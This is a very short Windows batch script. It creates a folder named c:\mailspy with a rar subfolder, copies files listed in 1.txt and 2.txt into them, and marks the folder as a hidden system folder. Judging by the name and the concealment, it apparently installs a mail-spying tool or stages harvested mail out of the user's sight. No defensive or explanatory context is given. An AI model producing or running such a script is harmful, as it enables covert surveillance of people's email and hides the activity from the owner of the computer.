@echo off

mkdir c:\mailspy\rar
for /f %%a in (1.txt) do copy /y %%a c:\mailspy\
for /f %%a in (2.txt) do copy /y %%a c:\mailspy\rar\
attrib +s +h c:\mailspy
